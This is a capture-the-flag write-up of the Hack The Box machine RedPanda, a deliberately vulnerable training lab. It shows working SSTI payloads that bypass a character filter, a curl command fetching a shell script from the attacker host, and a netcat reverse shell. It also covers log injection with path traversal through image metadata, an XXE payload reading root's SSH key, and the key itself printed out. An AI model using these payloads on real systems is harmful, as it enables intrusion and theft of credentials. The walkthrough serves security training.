---
layout: post
title: "[HTB] RedPanda"
description: "[Machine] - Easy difficulty"
background: '/img/bg-machine.jpg'
tags: [htb]
difficulty: Easy
---

![RedPanda](/img/htb_img/RedPanda_img/RedPanda.png)

OS: Linux
IP: 10.10.11.170
Complete: Yes
Created time: July 15, 2025 4:57 PM
Level: Easy
Status: Done

# Enumeration

## Nmap scan

```bash
❯ sudo nmap -p- --open --min-rate 1500 -T4 -sS -n -Pn -vvv -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 16:57 CEST
Initiating SYN Stealth Scan at 16:57
Scanning 10.10.11.170 [65535 ports]
Discovered open port 8080/tcp on 10.10.11.170
Discovered open port 22/tcp on 10.10.11.170
Completed SYN Stealth Scan at 16:57, 12.35s elapsed (65535 total ports)
Nmap scan report for 10.10.11.170
Host is up, received user-set (0.041s latency).
Scanned at 2025-07-15 16:57:34 CEST for 12s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.44 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)
```

Scripts and versions.

```bash
❯ nmap -p22,8080 -sCV -Pn -oN targeted $target     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 16:59 CEST
Nmap scan report for 10.10.11.170
Host is up (0.040s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http    Apache Tomcat (language: en)
|_http-title: Red Panda Search | Made with Spring Boot
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.79 seconds
```

SSH 8.2p1 running on a Ubuntu Server. Port 8080 TCP hosting an Apache Tomcat made with `Spring Boot`. Spring Boot is a Java framework.

---

![Red Panda Web Page](/img/htb_img/RedPanda_img/01.png)

Red Panda Web Page

## Source Code

Looking at the source code of the webpage we can see an endpoint at `/search`.

```bash

<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta author="wooden_k">
    <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
    <link rel="stylesheet" href="css/panda.css" type="text/css">
    <link rel="stylesheet" href="css/main.css" type="text/css">
    <title>Red Panda Search | Made with Spring Boot</title>
  </head>
  <body>

    <div class='pande'>
      <div class='ear left'></div>
      <div class='ear right'></div>
      <div class='whiskers left'>
          <span></span>
          <span></span>
          <span></span>
      </div>
      <div class='whiskers right'>
        <span></span>
        <span></span>
        <span></span>
      </div>
      <div class='face'>
        <div class='eye left'></div>
        <div class='eye right'></div>
        <div class='eyebrow left'></div>
        <div class='eyebrow right'></div>

        <div class='cheek left'></div>
        <div class='cheek right'></div>

        <div class='mouth'>
          <span class='nose'></span>
          <span class='lips-top'></span>
        </div>
      </div>
    </div>
    <h1>RED PANDA SEARCH</h1>
    <div class="wrapper" >
    <form class="searchForm" action="/search" method="POST">
    <div class="wrap">
      <div class="search">
        <input type="text" name="name" placeholder="Search for a red panda">
        <button type="submit" class="searchButton">
          <i class="fa fa-search"></i>
        </button>
      </div>
    </div>
    </form>
    </div>
  </body>
</html>

```

## Search box

![Search box](/img/htb_img/RedPanda_img/02.png)

Search box

If we hit enter without typing anything on the search box, we find Greg the Panda!

![Greg the panda](/img/htb_img/RedPanda_img/03.png)

Greg the panda

The author for this image seems to be someone called `woodenk`.

![image.png](/img/htb_img/RedPanda_img/04.png)

Here we can see some stats for the user `woodenk`. There is also another link for `damian`. The panda URIs are accesible from the browser and we can get all this images, as well as an export table option:

When entering a `{` it gives a Whitelabel Error, an typical error of Spring Boot on Java. When entering a STTI Payload, such as ${7*7}, we see a custom error `Banned characters`.
We can use a wordlist to enumerate all banned characters.

```bash
❯ wfuzz -c -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -u http://$target:8080/search -d name=FUZZ --ss banned
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.170:8080/search
Total requests: 95

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                               
=====================================================================

000000063:   200        28 L     69 W       755 Ch      "_"                                                                                                                                                                   
000000004:   200        28 L     69 W       755 Ch      "$"                                                                                                                                                                   
000000094:   200        28 L     69 W       755 Ch      "~"                                                                                                                                                                   

Total time: 0
Processed Requests: 95
Filtered Requests: 92
Requests/sec.: 0
```

So, we need to build some STTI payloads without _,$,~.

Quick search on PayloadAllTheThings, at the Java section we can see the following:

```bash
Freemarker - Basic Injection
The template can be :

Default: ${3*3}
Legacy: #{3*3}
Alternative: [=3*3] since FreeMarker 2.3.4
```

Trying the legacy one, hits the jackpot.

![Legacy SSTI](/img/htb_img/RedPanda_img/05.png)

Legacy SSTI

# Foothold

The legacy SSTI is working so we can use the `#` modifier. This corresponds to the `Codepen` template. Maybe other characters work aswell, so trying a bunch of others results in realizing that `*` and `@` also work, and better.

Using a basic payload, for example:

```bash
${T(java.lang.Runtime).getRuntime().exec('id')}
```

Changing the `$` for `*` results on the following hit:

![Panda SSTI](/img/htb_img/RedPanda_img/06.png)

Panda SSTI

It executes, but I don’t get a response, only the PID.
Firing up tshark can intercept the traffic so executing a ping through this SSTI will help us know if we can send a Reverse Shell.

```bash
# On the web:
${T(java.lang.Runtime).getRuntime().exec('ping -c 1 10.10.X.X')}

# On the terminal:
❯ tshark -i tun0 -f 'icmp'
Capturing on 'tun0'
    1 0.000000000 10.10.11.170 → 10.10.X.X  ICMP 84 Echo (ping) request  id=0x0002, seq=1/256, ttl=63
    2 0.000023331  10.10.X.X → 10.10.11.170 ICMP 84 Echo (ping) reply    id=0x0002, seq=1/256, ttl=64 (request in 1)
2 packets captured
```

## Shell as woodenk

I created a [`shell.sh`](http://shell.sh) locally, and then exploited the SSTI:

```bash
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('curl 10.10.X.X/shell.sh -o /tmp/shell.sh').getInputStream())}
```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.170 - - [15/Jul/2025 17:46:10] "GET /shell.sh HTTP/1.1" 200 -
```

And then we execute it to get a shell:

```bash
❯ nc -lvnp 4444                               
listening on [any] 4444 ...
connect to [10.10.X.X] from (UNKNOWN) [10.10.11.170] 36130
id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```

### Shell upgrading

```bash

script /dev/null -c bash
Script started, file is /dev/null
woodenk@redpanda:/tmp/hsperfdata_woodenk$ export TERM=xterm
export TERM=xterm
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ^Z
[1]  + 34652 suspended  nc -lvnp 4444
```

```bash
❯ stty raw -echo;fg                                                            
[1]  + 34652 continued  nc -lvnp 4444

woodenk@redpanda:/tmp/hsperfdata_woodenk$ 
woodenk@redpanda:/tmp/hsperfdata_woodenk$
woodenk@redpanda:~$ cat user.txt 
<REDACTED>
woodenk@redpanda:~$ 
```

# Privilege Escalation

In the home folder we can find a `.m2` folder, this is a Maven folder (Java).

Checking the `id` of the user shows the groups:

```bash
woodenk@redpanda:~$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```

As we can see, we are member of the logs group, so we can interactuate with items from this group.
We search for files from this group, excluding the ones at `/proc`, `~\.m2` and `/tmp`.

```bash
find / -group logs 2>/dev/null | grep -v -e '^/proc' -e '\.m2' -e '^/tmp/'
```

```bash
woodenk@redpanda:~$ find / -group logs 2>/dev/null | grep -v -e '^/proc' -e '\.m2' -e '^/tmp/'
/opt/panda_search/redpanda.log
/credits
/credits/damian_creds.xml
/credits/woodenk_creds.xml
```

## Opt

Interesting things at `/opt`.

A [cleanup.sh](http://cleanup.sh) script exists at /opt

```bash
woodenk@redpanda:/opt$ cat cleanup.sh 
#!/bin/bash
/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
```

This seems to delete any xml or jpg file existing on a bunch of folders.

---

## Pspy

I uploaded Pspy to the machine and started it. after 2 minutes we can see the following:

```bash
PID=2290   | /bin/sh -c /root/run_credits.sh 
PID=2289   | /usr/sbin/CRON -f 
PID=2292   | /bin/sh /root/run_credits.sh 
PID=2293   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
```

As we can see, first the `/root/run_credits.sh` script is executed, and that executes `java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar` as root.
The cleanup is also run after 5 minutes as well.

---

At the search folder we can find the following:

```bash
woodenk@redpanda:/opt/panda_search$ find . -name '*.java'
./.mvn/wrapper/MavenWrapperDownloader.java
./src/test/java/com/panda_search/htb/panda_search/PandaSearchApplicationTests.java
./src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java
./src/main/java/com/panda_search/htb/panda_search/MainController.java
./src/main/java/com/panda_search/htb/panda_search/PandaSearchApplication.java
```

Searching at the `MainController`:

```bash
package com.panda_search.htb.panda_search;

import java.util.ArrayList;
import java.io.IOException;
import java.sql.*;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.io.InputStream;
import java.io.FileInputStream;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.http.MediaType;

import org.apache.commons.io.IOUtils;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

@Controller
public class MainController {
  @GetMapping("/stats")
  	public ModelAndView stats(@RequestParam(name="author",required=false) String author, Model model) throws JDOMException, IOException{
		SAXBuilder saxBuilder = new SAXBuilder();
		if(author == null)
		author = "N/A";
		author = author.strip();
		System.out.println('"' + author + '"');
		if(author.equals("woodenk") || author.equals("damian"))
		{
			String path = "/credits/" + author + "_creds.xml";
			File fd = new File(path);
			Document doc = saxBuilder.build(fd);
			Element rootElement = doc.getRootElement();
			String totalviews = rootElement.getChildText("totalviews");
		      	List<Element> images = rootElement.getChildren("image");
			for(Element image: images)
				System.out.println(image.getChildText("uri"));
			model.addAttribute("noAuthor", false);
			model.addAttribute("author", author);
			model.addAttribute("totalviews", totalviews);
			model.addAttribute("images", images);
			return new ModelAndView("stats.html");
		}
		else
		{
			model.addAttribute("noAuthor", true);
			return new ModelAndView("stats.html");
		}
	}
  @GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
	public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

		System.out.println("Exporting xml of: " + author);
		if(author.equals("woodenk") || author.equals("damian"))
		{
			InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
			System.out.println(in);
			return IOUtils.toByteArray(in);
		}
		else
		{
			return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
		}
	}
  @PostMapping("/search")
	public ModelAndView search(@RequestParam("name") String name, Model model) {
	if(name.isEmpty())
	{
		name = "Greg";
	}
        String query = filter(name);
	ArrayList pandas = searchPanda(query);
        System.out.println("\n\""+query+"\"\n");
        model.addAttribute("query", query);
	model.addAttribute("pandas", pandas);
	model.addAttribute("n", pandas.size());
	return new ModelAndView("search.html");
	}
  public String filter(String arg) {
        String[] no_no_words = {"%", "_","$", "~", };
        for (String word : no_no_words) {
            if(arg.contains(word)){
                return "Error occured: banned characters";
            }
        }
        return arg;
    }
    public ArrayList searchPanda(String query) {

        Connection conn = null;
        PreparedStatement stmt = null;
        ArrayList<ArrayList> pandas = new ArrayList();
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();
            while(rs.next()){
                ArrayList<String> panda = new ArrayList<String>();
                panda.add(rs.getString("name"));
                panda.add(rs.getString("bio"));
                panda.add(rs.getString("imgloc"));
		panda.add(rs.getString("author"));
                pandas.add(panda);
            }
        }catch(Exception e){ System.out.println(e);}
        return pandas;
    }
}
```

> ("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
> 

We got some credentials.

The system writes to `/opt/panda_search/redpanda.log` in the format of:

`[response code]||[remote address]||[user agent]||[request uri]`

---

There’s another application in `/opt` named `credit-score`:

```bash
woodenk@redpanda:/opt$ find credit-score/ -type f
credit-score/LogParser/final/pom.xml.bak
credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
credit-score/LogParser/final/target/maven-status/maven-compiler-plugin/compile/default-compile/inputFiles.lst
credit-score/LogParser/final/target/maven-status/maven-compiler-plugin/compile/default-compile/createdFiles.lst
credit-score/LogParser/final/target/classes/com/logparser/App.class
credit-score/LogParser/final/.mvn/wrapper/maven-wrapper.jar
credit-score/LogParser/final/.mvn/wrapper/maven-wrapper.properties
credit-score/LogParser/final/.mvn/wrapper/MavenWrapperDownloader.java
credit-score/LogParser/final/pom.xml
credit-score/LogParser/final/mvnw
credit-score/LogParser/final/src/test/java/com/logparser/AppTest.java
credit-score/LogParser/final/src/main/java/com/logparser/App.java
```

App.java:

```bash
woodenk@redpanda:/opt$ cat credit-score/LogParser/final/src/main/java/com/logparser/App.java
package com.logparser;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);
        
        Document doc = saxBuilder.build(fd);
        
        Element rootElement = doc.getRootElement();
 
        for(Element el: rootElement.getChildren())
        {
    
            
            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}
```

The parseLog function is parsing every line. Then, for all the parsed data it’s calling getArtist and transforming it to String.

`main` uses the artist name to generate a path to a `[artist name]_creds.xml` file, which is passes along with the URI to `addViewTo`.

`addViewTo` parses the XML, increments the view count for that image, and then writes the file back:

## XXE File Read

### XML payload

First, create a malicious XML:

```bash
<?xml version="1.0" encoding="UTF-8">
<!DOCTYPE author [<!ENTITY xxe SYSTEM 'file:///root/.ssh/id_rsa'>]>
<credits>
	<author>&xxe;</author>
	<image>
		<uri>/img/greg.jpg</uri>
		<views>0</views>
	</image>
	<image>
		<uri>/img/hungy.jpg</uri>
		<views>0</views>
	</image>
	<image>
		<uri>/img/smooch.jpg</uri>
		<views>1</views>
	</image>
	<image>
		<uri>/img/smiley.jpg</uri>
		<views>1</views>
	</image>
	<totalviews>2</totalviews>
</credits>
```

And upload it to the machine.

### Metadata

With one of the site’s images: greg.jpg

```bash
❯ exiftool -Artist='../tmp/hax' greg.jpg 
Warning: [minor] Ignored empty rdf:Bag list for Iptc4xmpExt:LocationCreated - greg.jpg
    1 image files updated
```

Let us now make a malicious request to the remote host in order to create an entry in the /opt/panda_search/redpanda.log file, such that it redirects the getArtist() function to our malicious
image file. We can use cURL for this purpose along with the -A flag to send a request with a custom UserAgent HTTP header.

```bash
curl -A "evil||/../../../../../../../../../../tmp/greg.jpg" http://10.10.11.170:8080/
```

```bash
❯ curl -A "evil||/../../../../../../../../../../tmp/greg.jpg" http://10.10.11.170:8080/
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta author="wooden_k">
    <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
    <link rel="stylesheet" href="css/panda.css" type="text/css">
    <link rel="stylesheet" href="css/main.css" type="text/css">
    <title>Red Panda Search | Made with Spring Boot</title>
  </head>
  <body>

    <div class='pande'>
      <div class='ear left'></div>
      <div class='ear right'></div>
      <div class='whiskers left'>
          <span></span>
          <span></span>
          <span></span>
      </div>
      <div class='whiskers right'>
        <span></span>
        <span></span>
        <span></span>
      </div>
      <div class='face'>
        <div class='eye left'></div>
        <div class='eye right'></div>
        <div class='eyebrow left'></div>
        <div class='eyebrow right'></div>

        <div class='cheek left'></div>
        <div class='cheek right'></div>

        <div class='mouth'>
          <span class='nose'></span>
          <span class='lips-top'></span>
        </div>
      </div>
    </div>
    <h1>RED PANDA SEARCH</h1>
    <div class="wrapper" >
    <form class="searchForm" action="/search" method="POST">
    <div class="wrap">
      <div class="search">
        <input type="text" name="name" placeholder="Search for a red panda">
        <button type="submit" class="searchButton">
          <i class="fa fa-search"></i>
        </button>
      </div>
    </div>
    </form>
    </div>
  </body>
</html>
```

So, after a couple of minutes we can read the id_rsa from the root user.

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----
```

---

```bash
root@redpanda:~# cat /root/root.txt
<REDACTED>
root@redpanda:~#
```
